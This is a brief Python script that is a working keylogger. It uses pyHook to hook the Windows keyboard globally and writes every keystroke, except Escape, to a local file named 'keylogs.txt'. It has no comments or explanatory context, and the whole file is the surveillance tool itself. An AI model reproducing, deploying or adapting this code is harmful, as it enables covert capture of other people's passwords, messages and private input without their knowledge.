import pythoncom
import pyHook

LOG_FILE = "keylogs.txt"
terminate_key = '\x1B'

def OnKeyboardEvent(event):
    with open(LOG_FILE, 'a') as f:
        if event.Ascii != 27:
            key = chr(event.Ascii)
            f.write(key)
    return True

hook = pyHook.HookManager()
hook.KeyDown = OnKeyboardEvent
hook.HookKeyboard()
pythoncom.PumpMessages()
